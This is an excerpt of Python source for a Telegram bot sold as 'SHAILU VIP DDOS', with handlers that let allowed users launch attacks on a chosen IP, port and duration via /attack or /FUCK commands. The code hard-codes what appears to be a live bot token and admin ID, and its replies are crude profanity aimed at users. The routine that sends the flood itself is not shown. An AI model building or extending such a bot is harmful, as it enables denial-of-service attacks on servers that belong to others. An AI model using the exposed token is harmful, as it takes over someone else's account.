...
TELEGRAM_BOT_TOKEN = '7589475917:AAEuEQyqHhU36EopUXyjm3OGWarX6eM_aGc'
ADMIN_USER_ID =  6040233308
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        help_text = (
            ...
            "*⚡ /FUCK* - Trigger an attack operation.\n"
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @MRSHAILU01! /get_id*", parse_mode='Markdown')
        return
    message = (
        "*WELCOME 🤗 TO SHAILU VIP DDOS *\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀sever ki chudayi BY @MRSHAILU01 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @MRSHAILU01!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /FUCK <ip> <port> <duration>*", parse_mode='Markdown')
        return
    ...
    text=(
        ...
        f"*🔥chudai chalu h feedback bhej dena @MRSHAILU01💥*"
    ), parse_mode='Markdown')
